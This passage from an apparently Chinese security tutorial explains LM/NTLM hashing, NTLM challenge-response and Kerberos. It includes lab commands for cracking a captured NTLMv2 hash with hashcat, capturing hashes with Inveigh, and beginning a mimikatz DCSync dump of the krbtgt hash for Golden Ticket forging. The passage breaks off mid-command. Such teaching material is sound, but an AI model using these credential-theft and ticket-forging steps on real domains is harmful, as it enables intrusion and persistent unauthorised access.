class="hljs-number">894720062</span><br></code></pre></td></tr></table></figure><p>第二组：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">16</span>进制：<span class="hljs-number">32 33 00 00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>转换为二进制：<span class="hljs-number">00110010001100110000000000000000000000000000000000000000</span><br>七个为一组末尾补<br><span class="hljs-number">00110010</span><br><span class="hljs-number">00011000</span><br><span class="hljs-number">11000000</span><br><span class="hljs-number">00000000</span><br><span class="hljs-number">00000000</span><br><span class="hljs-number">00000000</span><br><span class="hljs-number">00000000</span><br><span class="hljs-number">00000000</span><br>合并后为<span class="hljs-number">0011001000011000110000000000000000000000000000000000000000000000</span><br>在转换为<span class="hljs-number">16</span>进制：<span class="hljs-number">3218</span>C<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>6、将以上步骤得到的两组8字节编码，分别作为DES加密key为魔术字符串 <strong>KGS!@#$%</strong> 进行加密 </p><p>KGS!@#$%的16进制为 4B47532140232425  作为明文进行加密</p><p>第一组：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima">明文：<span class="hljs-number">4B47532140232425</span><br>密钥：40A212A894720062<br>密文：6F08D7B306B1DAD4<br></code></pre></td></tr></table></figure><img src="/img/image-20231009151538585.png" alt="image-20231009151538585" style="zoom:80%;" /><p>第二组：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima">明文：<span class="hljs-number">4B47532140232425</span><br>密钥：3218C00000000000<br>密文：B75E0C8D76954A50<br></code></pre></td></tr></table></figure><img src="/img/image-20231009151752307.png" alt="image-20231009151752307" style="zoom:80%;" /><p>7、最终结果拼接即可6F08D7B306B1DAD4B75E0C8D76954A50  这个值就是LMhash值</p><h3 id="NTLM-hash原理"><a href="#NTLM-hash原理" class="headerlink" title="NTLM hash原理"></a>NTLM hash原理</h3><p>1.将明文口令转换成十六进制的格式 如：Admin@123 转换成Unicode格式，即在每个字节之后添加0x00</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">Admin@<span class="hljs-number">123</span>转<span class="hljs-number">16</span>进制 <span class="hljs-number">41646</span>D6<span class="hljs-number">96E40313233</span><br>添加<span class="hljs-number">00</span>：<span class="hljs-number">410064006</span>D0069006E0040003<span class="hljs-number">10032003300</span><br></code></pre></td></tr></table></figure><p>2.对Unicode字符串作MD4加密，生成32位的十六进制数字串 570a9a65db8fba761c1008a51d4c95ab</p><p><img src="/img/image-20231009152209061.png" alt="image-20231009152209061"></p><h3 id="SAM文件存储的内容"><a href="#SAM文件存储的内容" class="headerlink" title="SAM文件存储的内容"></a>SAM文件存储的内容</h3><p>以用户admin 密码Admin@123为例  lsass.exe文件生成的值和SAM文件存储的值即为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>:RID:LM‐HASH:NT‐HASH<br><span class="hljs-attribute">admin</span>:RID:<span class="hljs-number">6</span>F08D7B306B1DAD4B75E0C8D76954A50:<span class="hljs-number">570</span>a9a65db8fba761c1008a51d4c95ab<br></code></pre></td></tr></table></figure><h2 id="2-windows网络认证–基于挑战响应认证的NTLM协议"><a href="#2-windows网络认证–基于挑战响应认证的NTLM协议" class="headerlink" title="2.windows网络认证–基于挑战响应认证的NTLM协议"></a>2.windows网络认证–基于挑战响应认证的NTLM协议</h2><h3 id="网络认证NTLM协议简介"><a href="#网络认证NTLM协议简介" class="headerlink" title="网络认证NTLM协议简介"></a>网络认证NTLM协议简介</h3><p>在平时的测试中，经常会碰到处于工作组的计算机，处于工作组的计算机之间是无法建立一个可信的信托机构的， 只能是点对点进行信息的传输。举个例子就是，主机A想要访问主机B上的资源，就要向主机B发送一个存在于主机B上的一个账户，主机B接收以后会在本地进行验证，如果验证成功，才会允许主机A进行相应的访问。 </p><p>NTLM 协议是一种基于挑战（Chalenge）&#x2F;响应（Response） 认证机制，仅支持Windows的网络认证协议。</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">协商，这个是为了解决历史遗留问题，也就是为了向下兼容，双方先确定一下传输协议的版本等各种信息。<br>质询，这一步便是Chalenge/<span class="hljs-built_in">Response</span>认证机制的关键之处，下面会介绍这里的步骤。<br>验证，对质询的最后结果进行一个验证，验证通过后，即允许访问资源<br></code></pre></td></tr></table></figure><h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><h4 id="认证成功的流程"><a href="#认证成功的流程" class="headerlink" title="认证成功的流程"></a>认证成功的流程</h4><p>1、首先，client会向server发送一个username，这个username是存在于server上的一个用户</p><img src="/img/image-20231009153855803.png" alt="image-20231009153855803" style="zoom: 80%;" /><p>2、server首先会在本地查询是否存在这样的一个用户，如果存在，将会生成一个16位的随机字符，即Challenge，然后用查询到的这个user的NTLM hash对Challenge进行加密，生成Challenge1，将Challenge1存储在本地，并将 Challenge传给client。</p><img src="/img/image-20231009154103331.png" alt="image-20231009154103331" style="zoom:80%;" /><p>3、当client接收到Chalenge时，将发送的username所对应的NTLM hash对Challenge进行加密即Response，并 Response发送给server。</p><img src="/img/image-20231009154120614.png" alt="image-20231009154120614" style="zoom: 67%;" /><p>4、server在收到Response后，将其与Challenge1进行比较，如果相同，则验证成功</p><img src="/img/image-20231009154315113.png" alt="image-20231009154315113" style="zoom:80%;" /><h4 id="认证失败的流程"><a href="#认证失败的流程" class="headerlink" title="认证失败的流程"></a>认证失败的流程</h4><p>1、首先，client会向server发送一个username，这个username是存在于server上的一个用户</p><img src="/img/image-20231009154403511.png" alt="image-20231009154403511" style="zoom:80%;" /><p>2、当server接收到这个信息时，首先会在本地查询是否存在这样的一个用户，如果不存在，则直接返回认证失败</p><img src="/img/image-20231009154430297.png" alt="image-20231009154430297" style="zoom:80%;" /><h3 id="NTLM协议v1与v2的区别"><a href="#NTLM协议v1与v2的区别" class="headerlink" title="NTLM协议v1与v2的区别"></a>NTLM协议v1与v2的区别</h3><p>NTLM V2协议，NTLMv1与NTLM v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是 NTLM Hash</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">NTLM</span> <span class="hljs-built_in">v1</span>的Challenge有<span class="hljs-number">8</span>位，NTLM <span class="hljs-built_in">v1</span>的主要加密算法是DES<br><span class="hljs-symbol">NTLM</span> <span class="hljs-built_in">v2</span>的Challenge为<span class="hljs-number">16</span>位；NTLM <span class="hljs-built_in">v2</span>的主要加密算法是HMAC‐MD5<br></code></pre></td></tr></table></figure><h3 id="抓包分析实验"><a href="#抓包分析实验" class="headerlink" title="抓包分析实验"></a>抓包分析实验</h3><p>1.实验环境</p><p><img src="/img/image-20231009163808577.png" alt="image-20231009163808577"></p><p>2.windows10 安装wireshark</p><p>3、使用如下命令进行远程连接，并且使用wireshark 包</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\192.168.41.130 /<span class="hljs-keyword">u</span>:kkk Admin@123   建立连接<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> * /del   删除连接<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231009164117440.png" alt="image-20231009164117440"></p><p>4、前5个数据包中前四条时协商，第五个是认证的第一个数据包</p><p><img src="/img/image-20231009164148506.png" alt="image-20231009164148506"></p><p>5、第6个数据包就是返回challenge挑战值</p><p><img src="/img/image-20231009164204139.png" alt="image-20231009164204139"></p><p>分析该数据包得到chalenge值 53fb7eb8d40cc777</p><p><img src="/img/image-20231009164228194.png" alt="image-20231009164228194"></p><p>6、第7个数据包就是返回response的数据包 </p><p>response数据如下：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">3d</span>00ee8a5618f85651098b8005883d5c0101000000000000f790f7af9b92d8019cba65f5e39a1ea90000000002000e0042004d002d00320030003000380001000e0042004d002d00320030003000380004000e0042004d002d00320030003000380003000e0042004d002d00320030003000380007000800f790f7af9b92d801060004000200000008003000300000000000000001000000002000009906b326309f0ba76eb46b2271795e5d12df73e87035391df48f0fad1ce073380a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340031002e0031003300300000000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231009164302863.png" alt="image-20231009164302863"></p><p>7、接下来得到NTLMv2 数据，NTLMv2格式如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">username::<span class="hljs-keyword">domain</span>:challenge:HMAC‐MD5:blob<br>username：对应数据包中 <span class="hljs-keyword">user</span> <span class="hljs-type">name</span><br><span class="hljs-keyword">domain</span>:对应数据包中的 <span class="hljs-keyword">Domain</span> <span class="hljs-type">name</span><br>HMAC‐MD5：对应数据包中的NTProofStr<br>blob：数据库包中rsponse去掉HMAC‐MD5的值<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231009164334448.png" alt="image-20231009164334448"></p><p>8、最终的到HTLMv2如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kkk</span>:::<span class="hljs-number">53</span>fb7eb8d40cc777:<span class="hljs-number">3</span>d00ee8a5618f85651098b8005883d5c:<span class="hljs-number">0101000000000000</span>f790f7af9b92d8019cba65f5e39a1ea90000000002000e0042004d002d00320030003000380001000e0042004d002d00320030003000380004000e0042004d002d00320030003000380003000e0042004d002d00320030003000380007000800f790f7af9b92d801060004000200000008003000300000000000000001000000002000009906b326309f0ba76eb46b2271795e5d12df73e87035391df48f0fad1ce073380a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340031002e003100330030000000000000000000<br></code></pre></td></tr></table></figure><p>9、使用hashcat 破解密码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> ‐m <span class="hljs-number">5600</span> kkk:::<span class="hljs-number">53</span>fb7eb8d40cc777:<span class="hljs-number">3</span>d00ee8a5618f85651098b8005883d5c:<span class="hljs-number">0101000000000000</span>f790f7af9b92d8019cba65f5e39a1ea90000000002000e0042004d002d00320030003000380001000e0042004d002d00320030003000380004000e0042004d002d00320030003000380003000e0042004d002d00320030003000380007000800f790f7af9b92d801060004000200000008003000300000000000000001000000002000009906b326309f0ba76eb46b2271795e5d12df73e87035391df48f0fad1ce073380a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340031002e003100330030000000000000000000 <span class="hljs-number">1</span>.txt ‐‐force<br></code></pre></td></tr></table></figure><p>1.txt为密码字典</p><p>10、使用hashcat破解得到密码</p><p><img src="/img/image-20231009164435194.png" alt="image-20231009164435194"></p><h3 id="抓取HTLMv2值"><a href="#抓取HTLMv2值" class="headerlink" title="抓取HTLMv2值"></a>抓取HTLMv2值</h3><p>使用工具：Inveigh</p><img src="/img/image-20231009164715662.png" alt="image-20231009164715662" style="zoom:80%;" /><p>可以使用cs  3种方式：1.本地导入  2.上传文件到靶机   3.远程执行</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">开启监听：<br><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\Inveigh.psd1<br>Invoke-Inveigh -consoleoutput Y <br></code></pre></td></tr></table></figure><p>只要有人执行net use即可抓取到HTLMv2值</p><p><img src="/img/image-20231009164910004.png" alt="image-20231009164910004"></p><h2 id="3-windows域认证之Kerberos协议认证"><a href="#3-windows域认证之Kerberos协议认证" class="headerlink" title="3.windows域认证之Kerberos协议认证"></a>3.windows域认证之Kerberos协议认证</h2><h3 id="什么是Kerberos协议"><a href="#什么是Kerberos协议" class="headerlink" title="什么是Kerberos协议"></a>什么是Kerberos协议</h3><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 &#x2F; 服务器应用程序提供强大的认证服务。该 认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并 假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， <strong>Kerberos 作为一种可信任的第三方认证服务</strong>，是通过传统的密码技术（如：共享密钥）执行认证服务的</p><h3 id="Kerberos协议的组成角色"><a href="#Kerberos协议的组成角色" class="headerlink" title="Kerberos协议的组成角色"></a>Kerberos协议的组成角色</h3><p>在古希腊神话故事中，kerberos是一只具有三颗头颅的地狱恶犬，他守护在地狱之外，能够识别所有经此路过的亡 灵，防止活着的入侵者闯入地狱</p><p>kerberos协议中也存在三个角色，分别是</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">客户端（<span class="hljs-variable">client</span>）：发送请求的一方<br>服务端（<span class="hljs-variable">Server</span>）：接收请求的一方<br>密钥分发中心（<span class="hljs-built_in">Key</span> <span class="hljs-variable">Distribution</span> <span class="hljs-built_in">Center</span>，<span class="hljs-variable">KDC</span>），而密钥分发中心一般又分为两部分，分别是：<br><span class="hljs-variable">AS</span>（<span class="hljs-built_in">Authentication</span> <span class="hljs-variable">Server</span>）：认证服务器，专门用来认证客户端的身份并发放客户用于访问<span class="hljs-variable">TGS</span>的<span class="hljs-variable">TGT</span>（票据<br>授予票据）<br><span class="hljs-variable">TGS</span>（<span class="hljs-variable">Ticket</span> <span class="hljs-variable">Granting</span> <span class="hljs-variable">Ticket</span>）：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务<br>授予票据（<span class="hljs-variable">Ticket</span>）<br></code></pre></td></tr></table></figure><h3 id="Kerberos认证的简单流程"><a href="#Kerberos认证的简单流程" class="headerlink" title="Kerberos认证的简单流程"></a>Kerberos认证的简单流程</h3><p>举个例子：</p><p> A现在想要去访问B完成一个任务。但是AB两人之间是从来没有见过面的，他们只知道对方的名字叫A，B。此时如 果A直接去找B告诉B我就是A，那么B是有理由不相信A的，B同理也得不到A的认可，他们陷入了一个无 法证明我 就是我的困境。 </p><p>于是他们就想到了一个办法，AB找到了一个他俩共同信任的人C，且<strong>这个C既认识A又认识B</strong>，所以只要C告诉B，这个A确实就是真正的A那么B就会信任这个A，同理B经过C的认可后，A也会相信B的身份。此后，A在访问B之前会先去找C，C会交给A一个凭证，代表此时的A已经得到了C的认证，这时A拿着凭证再去找B，便可以得到B的确认了。</p><p>再举个例子： </p><p>我们去动物园，动物园不认识你不让你进，你也怕进门后不是动物园，所以就很尴尬</p><p><img src="/img/image-20231009172740642.png" alt="image-20231009172740642"></p><p>如何解决呢？我们建立一个售票窗口，只要售票处认识你和动物园，你和动物园之间就可以相互信任。</p><p><img src="/img/image-20231009172805409.png" alt="image-20231009172805409"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">人：代表客户端<br>动物园：代表服务端<br>售票处：代表KDC<br></code></pre></td></tr></table></figure><p>所以整个kerberos认证流程可以简化描述如下： </p><p>客户端在访问每个想要访问的网络服务时，他需要携带一个专门用于访问该服务并且能够证明自己身份的票据，当服务端收到了该票据他才能认定客户端身份正确，向客户端提供服务。所以整个认证流程可简化为两大步：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1、客户端向KDC请求获取想要访问的目标服务的服务授予票据（Ticket）；<br>2、客户端拿着从KDC获取的服务授予票据（Ticket）访问相应的网络服务<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231009173548739.png" alt="image-20231009173548739"></p><h3 id="Kerberos认证完整流程"><a href="#Kerberos认证完整流程" class="headerlink" title="Kerberos认证完整流程"></a>Kerberos认证完整流程</h3><p>在上述的流程中，其实还有一个问题，那就是 </p><p>1.KDC怎么知道你（客户端）就是真正的客户端？凭什么给你发放服务授予票据（Ticket）呢？</p><p>我们以去动物园为例，售票处凭什么给你买票，你如果是一个逃犯怎么办？其实买票的过程我们可以分为两步第一 才步是你拿着身份证去验证，第二步身份验证通过了才会给你票</p><img src="/img/image-20231009173908563.png" alt="image-20231009173908563" style="zoom:80%;" /><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cos">人：代表客户端<br>动物园：代表服务端<br>售票处：KDC<br>身份校验人员:<span class="hljs-keyword">AS</span>，负责验证用户身份的合法性，和给用户一个可以买票的票（TGT）<br>卖票人员：TGS，负责客户端访问服务端时所需的服务授予票据的单位<br></code></pre></td></tr></table></figure><p>所以kerberos通信可以分为3步</p><h4 id="通信第一步-客户端和AS进行通信"><a href="#通信第一步-客户端和AS进行通信" class="headerlink" title="通信第一步-客户端和AS进行通信"></a>通信第一步-客户端和AS进行通信</h4><p>​为了获得能够用来访问服务端服务的票据，客户端首先需要来到KDC获得服务授予票据（Ticket）。由于客户端是第一次访问KDC，此时KDC也不确定该客户端的身份，所以第一次通信的目的为KDC认证客户端身份，确认客户端是一个可靠且拥有访问KDC权限的客户端，</p><p><img src="/img/image-20231009173952708.png" alt="image-20231009173952708"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>、客户端用户向KDC以明文的方式发起请求。该次请求中携带了自己的用户名，主机IP，和当前时间戳；<br><span class="hljs-number">2</span>、KDC当中的<span class="hljs-keyword">AS</span>（Authentication <span class="hljs-keyword">Server</span>）接收请求（<span class="hljs-keyword">AS</span>是KDC中专门用来认证客户端身份的认证服务器）后去<br>kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可<br>靠性；<br><span class="hljs-number">3</span>、如果没有该用户名，认证失败，服务结束；如果存在该用户名，则<span class="hljs-keyword">AS</span>认证中心便认为用户存在，此时便会返回响应给客户端，其中包含两部分内容：<br><span class="hljs-number">3.1</span>、第一部分内容称为TGT，他叫做票据授予票据，客户端需要使用TGT去KDC中的TGS（票据授予中心）获取访问网络服务所需的Ticket（服务授予票据），TGT中包含的内容有kerberos数据库中存在的该客户端的<span class="hljs-type">Name</span>，IP，当前时间戳，客户端即将访问的TGS的<span class="hljs-type">Name</span>，TGT的有效时间以及用于客户端和TGS间进行通信的Session_key(CT_SK)。<br>整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情况。<br><span class="hljs-number">3.2</span>第二部分内容是使用客户端密钥加密的一段内容，其中包括用于客户端和TGS间通信的Session_key(CT_SK),客户端即将访问的TGS的<span class="hljs-type">Name</span>以及TGT的有效时间，和一个当前时间戳。该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而终端认证流程。<br>至此，第一次通信完成。<br></code></pre></td></tr></table></figure><h4 id="通信第二步-客户端和TGS进行通信"><a href="#通信第二步-客户端和TGS进行通信" class="headerlink" title="通信第二步-客户端和TGS进行通信"></a>通信第二步-客户端和TGS进行通信</h4><p>​此时的客户端收到了来自KDC（其实是AS）的响应，并获取到了其中的两部分内容。此时客户端会用自己的密钥将 第二部分内容进行解密，分别获得时间戳，自己将要访问的TGS的信息，和用于与TGS通信时的密钥CT_SK。首先 他会根据时间戳判断该时间戳与自己发送请求时的时间之间的差值是否大于5分钟，如果大于五分钟则认为该AS是 伪造的，认证至此失败。如果时间戳合理，客户端便准备向TGS发起请求</p><p><img src="/img/image-20231009174038108.png" alt="image-20231009174038108"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">客户端行为：<br><span class="hljs-number">1</span>、客户端使用CT_SK加密将自己的客户端信息发送给KDC，其中包括客户端名，IP，时间戳；<br><span class="hljs-number">2</span>、客户端将自己想要访问的<span class="hljs-keyword">Server</span>服务以明文的方式发送给KDC；<br><span class="hljs-number">3</span>、客户端将使用TGS密钥加密的TGT也原封不动的也携带给KDC；<br><br>TGS行为：<br><span class="hljs-number">1</span>、此时KDC中的TGS（票据授予服务器）收到了来自客户端的请求。他首先根据客户端明文传输过来的<span class="hljs-keyword">Server</span>服务IP查看当前kerberos系统中是否存在可以被用户访问的该服务。如果不存在，认证失败结束。如果存在，继续接下来的认证。<br><span class="hljs-number">2</span>、TGS使用自己的密钥将TGT中的内容进行解密，此时他看到了经过<span class="hljs-keyword">AS</span>认证过后并记录的用户信息，一把Session_KEY即CT_SK，还有时间戳信息，他会现根据时间戳判断此次通信是否真是可靠有无超出时延。<br><span class="hljs-number">3</span>、如果时延正常，则TGS会使用CT_SK对客户端的第一部分内容进行解密（使用CT_SK加密的客户端信息），取出其中的用户信息和TGT中的用户信息进行比对，如果全部相同则认为客户端身份正确，方可继续进行下一步。<br><span class="hljs-number">4</span>、此时KDC将返回响应给客户端，响应内容包括：<br>第一部分：用于客户端访问网络服务的使用<span class="hljs-keyword">Server</span>密码加密的ST（Servre Ticket），其中包括客户端的<span class="hljs-type">Name</span>，IP，需要访问的网络服务的地址<span class="hljs-keyword">Server</span> IP，ST的有效时间，时间戳以及用于客户端和服务端之间通信CS_SK（<span class="hljs-keyword">Session</span> Key）。<br>第二部分：使用CT_SK加密的内容，其中包括CS_SK和时间戳，还有ST的有效时间。由于在第一次通信的过程中，<span class="hljs-keyword">AS</span>已将CT_SK通过客户端密码加密交给了客户端，且客户端解密并缓存了CT_SK，所以该部分内容在客户端接收到时是可以自己解密的。至此，第二次通信完成。<br></code></pre></td></tr></table></figure><h4 id="通信第三步-客户端和服务端进行通信"><a href="#通信第三步-客户端和服务端进行通信" class="headerlink" title="通信第三步-客户端和服务端进行通信"></a>通信第三步-客户端和服务端进行通信</h4><p>​此时的客户端收到了来自KDC（TGS）的响应，并使用缓存在本地的CT_SK解密了第二部分内容（第一部分内容中 的ST是由Server密码加密的，客户端无法解密），检查时间戳无误后取出其中的CS_SK准备向服务端发起最后的请求。</p><p><img src="/img/image-20231009174117654.png" alt="image-20231009174117654"></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino">客户端：<br><span class="hljs-number">1</span>、客户端使用CS_SK将自己的主机信息和时间戳进行加密作为交给服务端的第一部分内容，然后将ST（服务授予票据）<br>作为第二部分内容都发送给服务端。<br>服务端：<br><span class="hljs-number">1</span>、服务器此时收到了来自客户端的请求，他会使用自己的密钥，即<span class="hljs-built_in">Server</span>密钥将客户端第二部分内容进行解密，核对时间戳之后将其中的CS_SK取出，使用CS_SK将客户端发来的第一部分内容进行解密，从而获得经过TGS认证过后的客户端信息，此时他将这部分信息和客户端第二部分内容带来的自己的信息进行比对，最终确认该客户端就是经过了KDC认证的具有真实身份的客户端，是他可以提供服务的客户端。此时服务端返回一段使用CT_SK加密的表示接收请求的响应给客户端，在客户端收到请求之后，使用缓存在本地的CS_ST解密之后也确定了服务端的身份（其实服务端在通信的过程中还会使用数字证书证明自己身份）。<br>至此，第三次通信完成。此时也代表着整个kerberos认证的完成，通信的双方都确认了对方的身份，此时便可以放心的进行整个网络通信了。<br></code></pre></td></tr></table></figure><p>总体流程如下</p><p><img src="/img/image-20231009174149420.png" alt="image-20231009174149420"></p><h2 id="4-Golden-Ticket黄金票据制作原理及利用方式"><a href="#4-Golden-Ticket黄金票据制作原理及利用方式" class="headerlink" title="4.Golden Ticket黄金票据制作原理及利用方式"></a>4.Golden Ticket黄金票据制作原理及利用方式</h2><h3 id="Krbtgt账户介绍"><a href="#Krbtgt账户介绍" class="headerlink" title="Krbtgt账户介绍"></a>Krbtgt账户介绍</h3><p>krbtgt用户，<strong>是系统在创建域时自动生成的一个帐号</strong>，其作用是<strong>密钥分发中心的服务账号</strong>，其密码是系统随机生成 的，无法登录主机</p><p><img src="/img/image-20231010145650895.png" alt="image-20231010145650895"></p><h3 id="黄金票据原理"><a href="#黄金票据原理" class="headerlink" title="黄金票据原理"></a>黄金票据原理</h3><p><strong>本质：伪造TGT</strong></p><p><strong>用途：权限维持</strong></p><p>TGT&#x3D;Krbtgt的ntlm hash 加密 </p><p>1、Kerberos中的TGT和Logon Session Key（CT_SK）是AS返回的 ，TGT它是由Krbtgt加密和签名的 ,krbtgt的 NTLM Hash又是固定的,而CT_SK并不会保存在KDC中。 </p><p>2、所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key（CT_SK）。 </p><p>3、Client与TGS的交互中，而已有了金票后（TGT）,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</p><p>当我们获得域控的控制权限后，有可能获取域内所有用户的hash，和krbtgt的hash。这时，由于一些原因导致我 们失去对目标的控制权，但是我们还留有一个普通用户的权限，并且krbtgt的密码没有更改，此时我们可以<strong>利用 krbtgt用户的ntlm hash制作黄金票据伪造TGT，重新获取域控的管理权限。</strong></p><p><img src="/img/image-20231010145937348.png" alt="image-20231010145937348"></p><p>我们在以去动物园为例，当我们去买票的时候，我么首先第一步是去身份认证管理员那里认证身份</p><p><img src="/img/image-20231010145956811.png" alt="image-20231010145956811"></p><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><table><thead><tr><th>实验机器</th><th>IP地址</th></tr></thead><tbody><tr><td>windows Server 2012(域控)</td><td>10.210.100.10</td></tr><tr><td>windows Server 2008(域内成员)</td><td>10.210.100.20</td></tr></tbody></table><h4 id="实验前提"><a href="#实验前提" class="headerlink" title="实验前提"></a>实验前提</h4><p>1、已经控制了域名并且使用域管理员登录或者提权的system </p><p>如果域管理员发现了你控制了域控机器，把你的后门删除了，那么就不能继续控制域控了，这个时候当我们可以伪造TGT重新获得域控的权限 条件如下：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1</span>、域名称<br><span class="hljs-number">2</span>、域的SID值<br><span class="hljs-number">3</span>、域的KRBTGT账号的<span class="hljs-built_in">HASH</span><br><span class="hljs-number">4</span>、伪造任意用户名<br>（获取域的SID和KRBTGT账号的NTLM <span class="hljs-built_in">HASH</span>的前提是需要已经拿到了域的权限）<br></code></pre></td></tr></table></figure><h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>1、目前已经控制了域控和域内机器</p><p><img src="/img/image-20231010152245413.png" alt="image-20231010152245413"></p><p>2、获取关键信息</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">whoami</span> /user 获取域的sid值(去掉最后的‐500，500表示为administrator用户)</span><br><span class="hljs-keyword">shell</span><span class="language-bash"> net config workstation 查看域</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231010152411743.png" alt="image-20231010152411743"></p><p>域sid：S-1-5-21-2431442348-1717482385-2017137259</p><p><img src="/img/image-20231010152459188.png" alt="image-20231010152459188"></p><p>域名称：hack.com</p><p>3、使用mimikatz导出KRBTGT的ntlm hash</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz lsadump::dcsync <span class="hljs-regexp">/domain:hack.com 